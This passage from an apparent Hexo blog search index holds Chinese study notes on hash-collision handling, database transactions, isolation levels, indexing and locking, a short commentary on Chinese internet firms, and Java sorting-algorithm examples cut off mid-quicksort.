/>③开放定址法为减少冲突，要求装填因子α较小，故当结点规模较大时会浪费很多空间。而拉链法中可取α≥1，且结点较大时，拉链法中增加的指针域可忽略不计，因此节省空间；<br />④在用拉链法构造的散列表中，删除结点的操作易于实现。只要简单地删去链表上相应的结点即可。</p><p>拉链法的缺点<br />　拉链法的缺点是：指针需要额外的空间，故当结点规模较小时，开放定址法较为节省空间，而若将节省的指针空间用来扩大散列表的规模，可使装填因子变小，这又减少了开放定址法中的冲突，从而提高平均查找速度。</p><h3 id="再散列双重散列-多重散列"><a class="markdownIt-Anchor" href="#再散列双重散列-多重散列"></a> 再散列（双重散列、多重散列）</h3><p>当发生冲突时，使用第二个、第三个、哈希函数计算地址，直到无冲突时。缺点：计算时间增加。</p><h3 id="建立一个公共溢出区"><a class="markdownIt-Anchor" href="#建立一个公共溢出区"></a> 建立一个公共溢出区</h3><p>假设哈希函数的值域为[0,m-1],则设向量HashTable[0…m-1]为基本表，另外设立存储空间向量OverTable[0…v]用以存储发生冲突的记录。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于互联网行业的一些看法（摘抄）</title>
      <link href="/view-for-internet/"/>
      <url>/view-for-internet/</url>
      
        <content type="html"><![CDATA[<h2 id="这是最坏的时代也是最好的时代"><a class="markdownIt-Anchor" href="#这是最坏的时代也是最好的时代"></a> 这是最坏的时代，也是最好的时代</h2><h3 id="字节跳动"><a class="markdownIt-Anchor" href="#字节跳动"></a> 字节跳动</h3><p>今日头条打造“千人千面”的客户端，撕开了四大门户的壁垒；抖音利用年轻人的内心，结合其强大的内容分发机制，占据了原本属于微信的用户使用时间，使得腾讯不得不做出调整，也让新浪微博产生了一丝恐惧，而且自有的推荐算法也让其广告业务迅速盈利，使得百度在其原有的凤巢基础上成立新部门以应对头条的威胁。</p><h3 id="滴滴"><a class="markdownIt-Anchor" href="#滴滴"></a> 滴滴</h3><p>背靠腾讯以及阿里这两个大金主，将Uber赶出中国市场，打造了中国最大的出行平台。</p><h3 id="美团"><a class="markdownIt-Anchor" href="#美团"></a> 美团</h3><p>作为全球绝无仅有的独特理念，打造了全球最大的餐饮外卖服务提供商，并大手笔收购摩拜，解决了当下人们的“最后一公里”问题。</p><h3 id="拼多多"><a class="markdownIt-Anchor" href="#拼多多"></a> 拼多多</h3><p>原本以为京东和淘宝已经形成了无人撼动的地位，但是拼多多利用“社交+电商”的模式，利用腾讯提供的优势，作成了多年来腾讯一直想实现的“电商梦”，困扰京东淘宝多年的用户下沉问题也随之解决。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库总结</title>
      <link href="/database-summary/"/>
      <url>/database-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="事务四大特性acid"><a class="markdownIt-Anchor" href="#事务四大特性acid"></a> 事务四大特性（ACID）</h2><p>数据库事务是指作为单个逻辑工作单元执行的一系列操作，这些操作要么全做要么全不做，是一个不可分割的工作单位。</p><ol><li>原子性(Atomicity)<br />事务的原子性是指，事务中包含的程序作为数据库的逻辑工作单位，它所做的对数据的修改操作要么全部执行，要么完全不执行。这种特性称为原子性。</li><li>一致性(Consistency)<br />事务一致性指的是在一个事务执行之前和执行之后数据库都必须处于一致性状态。这种特性称为事务的一致性。假如数据库的状态满足所有的完整性约束，就说该数据库是一致的。例如完整性约束：a + b = 10，一个事物改变了a，那么b也随之改变。</li><li>分离性(也称为独立性，lsolation)<br />分离性指并发的事务是相互隔离的。即一个事物内部的操作及正在操作的数据必须封锁起来，不被其他企图进行修改的事务看到。假如并发交叉执行的事务没有任何限制，操纵相关的共享对象的多个并发事务的执行可能引起异常。</li><li>持久性(Durability)<br />持久性意味着当系统或介质发生故障时，确保已提交事务的更新不能丢失。即一旦一个事务提交，DBMS保证它对数据库中数据的改变应该是永久性的，即对已提交事务的更新能恢复。持久性通过数据库备份和恢复来保证。</li></ol><h2 id="事务隔离性以及在mysql中的实践"><a class="markdownIt-Anchor" href="#事务隔离性以及在mysql中的实践"></a> 事务隔离性以及在MySQL中的实践</h2><p>数据库事务是指作为单个逻辑工作单元执行的一系列操作，要么全部执行，要么全部不执行。一方面，当多个应用程序并发访问数据库时，事务可以在应用程序间提供一个隔离方法，防止互相干扰；另一方面，事务为数据库操作序列提供了一个从失败恢复正常的方法。</p><p>当多个线程都开启事务操作数据库中的数据时，数据库系统要能进行隔离操作，以保证各个线程获取数据的准确性。</p><ol><li><p>如果没有隔离，会发生以下情况</p><ul><li>脏读：对于两个事务T1、T2，T1读取了已经被T2更新但还没有提交的字段，之后，若T2回滚，T1读取到的内容就是临时无效的内容。</li><li>不可重复读：对于事务T1、T2，T1需要读取一个字段两次，在第一次和第二次读取之间，T2更新了该字段，导致T1第二次读取到的内容值不同。</li><li>幻读：事务A读取与搜索条件相匹配的若干行。事务B以插入或删除行等方式来修改事务A的结果集，然后再提交。幻读与不可重复读之间的区别是幻读强调的是新增或删除，而不可重复读强调的是修改。比如Mary两次查工资，中间有人改过工资，则两次结果不一样，这就是不可重复读。Mary要查工资一千的人数，第一次查到了10个，中间有人增加了一条工资为一千的人，下次查的时候就变成了11个，好像第一次查询的是幻觉一样。</li></ul></li><li><p>事务的四个隔离级别<br />读未提交、读已提交、可重复读、串行化。四个级别增强逐渐增强，每个级别解决上个级别的一个问题。</p><ul><li>读未提交：另一个事务修改了数据，但尚未提交，而本事务中的select会读到这些未被提交的数据（脏读）。脏读是指另一个事务修改了数据，但尚未提交，而本事务中的select会读到这些未被提交的数据</li><li>读已提交：本事务读取到的是最新的数据（其他事务提交后）。问题是，在同一事务里，前后两次相同的select会读到不同的结果（不可重复读）。不可重复读是指同一个事务执行过程中，另外一个事务提交了新数据，因此本事务先后两次读到的数据结果会不一致。</li><li>可重复读：在同一个事务里，select的结果是事务开始时间点的状态，同样的select操作读到的结果会是一致的，但是有幻读现象。可重复读保证了同一个事务里，查询的结果都是事务开始时的状态（一致性）。但是，如果另一个事务同时提交了新数据，本事务再更新时，就会发现了这些新数据，貌似之前读到的数据都是幻觉，这就是幻读。</li><li>串行化：所有事务只能一个接一个串行执行，不能并行</li></ul></li></ol><p><strong>隔离级别的选择</strong><br />MySQL支持四种隔离级别，默认的是可重复读</p><h2 id="mysql的两种存储引擎区别"><a class="markdownIt-Anchor" href="#mysql的两种存储引擎区别"></a> MYSQL的两种存储引擎区别</h2><ul><li>MyISAM类型不支持事务处理等高级处理，而InnoDB类型支持</li><li>MyISAM表不支持外键，InnoDB支持</li><li>MyISAM锁的粒度是表级，而InnoDB支持行级锁定<br />MyISAM相对简单，所以在效率上要优于InnoDB，小型应用可以考虑使用MyISAM，当你的数据库有大量的写入、更新操作而查询比较少或者数据完整性要求比较高的时候就选择Innodb表。当你的数据库主要以查询为主，相比较而言更新和写入比较少，并且业务方面数据完整性要求不那么严格，就选择mysiam表。</li></ul><p><strong>应用场景：</strong></p><ul><li>MyIASM管理非事务表，提供高速存储和检索以及全文搜索能力，如果在应用中执行大量的select操作，应该选择MyIASM</li><li>InnoDB用于事务处理，具有ACID事务支持等特性，如果在应用中执行大量的insert和update操作，应该选择InnoDB</li></ul><h2 id="数据库的优化从sql语句优化和索引两个部分回答"><a class="markdownIt-Anchor" href="#数据库的优化从sql语句优化和索引两个部分回答"></a> 数据库的优化（从sql语句优化和索引两个部分回答）</h2><ol><li><p>只返回需要的数据</p><ul><li>不要写select * 的语句</li><li>合理写where子句，不要写没有where的SQL语句</li></ul></li><li><p>尽量少做重复的工作</p><ul><li>可以合并一些SQL语句</li></ul></li><li><p>适当建立索引（不是越多越好）但以下几点会进行全表扫描</p><ul><li>左模糊查询‘%…’</li><li>使用了不等操作符!=</li><li>or使用不当，or两边都必须有索引才行</li><li>in、not in</li><li>where子句对字段进行表达式操作</li><li>对于创建的复合索引（从最左边开始组合），查询条件用到的列必须从左边开始不能间隔。否则无效，复合索引的结构与电话簿类似</li><li>全文索引：当对于文件建立了一个以词库为目录的索引（文件大全文索引比模糊匹配效果好）</li></ul></li><li><p>使用join代替子查询</p></li><li><p>使用union代替手动创建临时表</p></li></ol><h2 id="乐观锁与悲观锁"><a class="markdownIt-Anchor" href="#乐观锁与悲观锁"></a> 乐观锁与悲观锁</h2><p>当并发事务同时访问一个资源时，有可能导致数据不一致，因此需要一种机制来将数据访问顺序化，以保证数据库数据的一致性。锁就是其中一种机制。在计算机科学中，锁时在执行多线程时用于强行限制资源访问的同步机制，即用于在并发控制保证对互斥要求的满足。在数据库的锁机制中，数据库管理系统中的并发控制的任务是确保在多个事务同时存取数据库中同一数据时不破坏事务的隔离性和统一性以及数据库的统一性。</p><p>乐观并发控制（乐观锁）和悲观并发控制（悲观锁）是并发控制主要采用的技术手段。</p><p>悲观锁是一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作对某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。主要用于数据争用激烈的环境，以及发生冲突时使用锁保护数据的成本要低于该锁冲突的操作。</p><p>悲观锁的流程：在对任意记录进行修改前，先尝试为该记录加上排他锁；如果加锁失败，说明该记录正在被修改，那么当前查询可能要等待或者抛出异常。如果成功加锁，那么就可以对记录做修改，事务完成后就会解锁。期间有任何对该记录做修改或加排他锁的操作，都会等待我们解锁或者直接抛出异常。</p><p>悲观锁的缺点：悲观并发控制实际上是“先取锁再访问”的保守策略，为数据处理的安全提供了保证。但是在效率方面，处理加锁的机制会让数据库产生额外的开销，还有增加产生死锁的机会；另外，在只读型事务处理中由于不会产生冲突，也没必要使用锁，这样做只能增加系统负载；还有会降低了并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数据。</p><p>乐观锁，它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各种影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，在没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。</p><p>相对于悲观锁，在对数据库进行处理的时候，乐观锁并不会使用数据库提供的锁机制。一般的实现乐观锁的方式就是记录数据版本。实现数据版本有两种方式，<strong>第一种是使用版本号，第二种是使用时间戳</strong>。</p><p>乐观并发控制相信事务之间的数据竞争(data race)的概率是比较小的，因此尽可能直接做下去，直到提交的时候才去锁定，所以不会产生任何锁和死锁。但如果直接简单这么做，还是有可能会遇到不可预期的结果，例如两个事务都读取了数据库的某一行，经过修改以后写回数据库，这时就遇到了问题。</p><h2 id="关系型数据库和非关系型数据库区别"><a class="markdownIt-Anchor" href="#关系型数据库和非关系型数据库区别"></a> 关系型数据库和非关系型数据库区别</h2><p>一般非关系数据库是基于CAP模型，而传统的关系型数据库是基于ACID模型的</p><ol><li>数据存储结构<br />首先关系型数据库一般都有固定的表结构，并且需要通过DDL语句来修改表结构，不是很容易进行扩展，而非关系数据库的存储机制就有很多了，比如基于文档的、K-V键值对的，还有基于图的等，对于数据的格式十分灵活没有固定的表结构，方便扩展，因此如果业务的数据结构并不是固定的或者经常变动比较大的，那么非关系数据库是个好的选择。</li><li>可扩展性<br />传统的关系型数据库给人一种横向扩展难，不好对数据进行分片等，而一些非关系型数据库则原生就支持数据的水平扩展，并且这可能也是很多NoSQL的一大卖点，其实像MySQL这种关系型数据库的水平扩展也不是很难，即使NoSQL水平扩展容易但对于向跨分片进行joins没有好的解决办法。不管是关系型还是非关系型数据库，解决水平扩展或者跨分片Joins这种场景，在应用层和数据库层中间加一层中间件来做数据处理也许是个好的办法。</li><li>数据一致性<br />非关系型数据库一般强调的是数据最终一致性，而没有像ACID一样强调数据的强一致性，从非关系型数据库中读到的有可能还是处于一个中间态的数据，因此如果你的业务对于数据的一致性要求很高，那么应该选择关系型数据库。非关系型数据库可能更多的偏向于OLAP场景，而关系型数据库更多偏向于OLTP场景。</li></ol><p>博客<a href="http://www.cnblogs.com/wanghongyun/p/6193912.html" target="_blank" rel="noopener">SQL与NoSQL（关系型与非关系型）数据库的区别</a></p><h2 id="聚集索引与非聚集索引以及sql的查询优化技术"><a class="markdownIt-Anchor" href="#聚集索引与非聚集索引以及sql的查询优化技术"></a> 聚集索引与非聚集索引以及SQL的查询优化技术</h2><p>聚集索引：聚集索引的顺序就是数据的物理存储顺序；<br />非聚集索引：索引顺序与数据物理排列顺序无关。<br />正因为如此，所以一个表最多只能有一个聚簇索引。简单来说，聚簇索引的叶子节点就是数据节点，非聚簇索引的叶节点仍然为索引节点，只不过有一个指针指向对应的数据块。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/algorithm-sort/"/>
      <url>/algorithm-sort/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 22:03</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 冒泡排序</span></span><br><span class="line"><span class="comment"> * o(n^2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bubbleSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums.length - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                    nums[j] = nums[j + <span class="number">1</span>];</span><br><span class="line">                    nums[j + <span class="number">1</span>] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        bubbleSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 21:31</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 堆排序</span></span><br><span class="line"><span class="comment"> * o(nlogn)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 先建立最大堆，然后排序</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">heapSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> index = nums.length;</span><br><span class="line">        heapify(nums);</span><br><span class="line">        <span class="keyword">while</span> (index &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[index - <span class="number">1</span>];</span><br><span class="line">            nums[index - <span class="number">1</span>] = nums[<span class="number">0</span>];</span><br><span class="line">            nums[<span class="number">0</span>] = tmp;</span><br><span class="line"></span><br><span class="line">            index--;</span><br><span class="line">            helper(nums, index, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = (nums.length - <span class="number">1</span>) / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            helper(nums, nums.length, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> len, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; len) &#123;</span><br><span class="line">            <span class="keyword">int</span> largest = k;</span><br><span class="line">            <span class="keyword">if</span> (k * <span class="number">2</span> + <span class="number">1</span> &lt; len &amp;&amp; nums[largest] &lt; nums[k * <span class="number">2</span> + <span class="number">1</span>]) &#123;</span><br><span class="line">                largest = k * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k * <span class="number">2</span> + <span class="number">2</span> &lt; len &amp;&amp; nums[largest] &lt; nums[k * <span class="number">2</span> + <span class="number">2</span>]) &#123;</span><br><span class="line">                largest = k * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k == largest) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[largest];</span><br><span class="line">            nums[largest] = nums[k];</span><br><span class="line">            nums[k] = tmp;</span><br><span class="line"></span><br><span class="line">            k = largest;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 20:03</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 希尔排序</span></span><br><span class="line"><span class="comment"> * o(n^1.5)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">insertShell</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">int</span> len = n / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (len &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - len; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[j] &gt; nums[j + len]) &#123;</span><br><span class="line">                        <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                        nums[j] = nums[j + len];</span><br><span class="line">                        nums[j + len] = tmp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            len /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        insertSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 19:52</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 直接插入排序，当前位置与它前面的数字比较，看插入哪一个位置</span></span><br><span class="line"><span class="comment"> * o(n^2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">insertSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                    nums[j] = nums[j + <span class="number">1</span>];</span><br><span class="line">                    nums[j + <span class="number">1</span>] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        insertSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by hta on 17-5-5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        quickSort(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            System.out.println(num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = start;</span><br><span class="line">        <span class="keyword">int</span> right = end;</span><br><span class="line">        <span class="keyword">int</span> pivot = nums[(start + 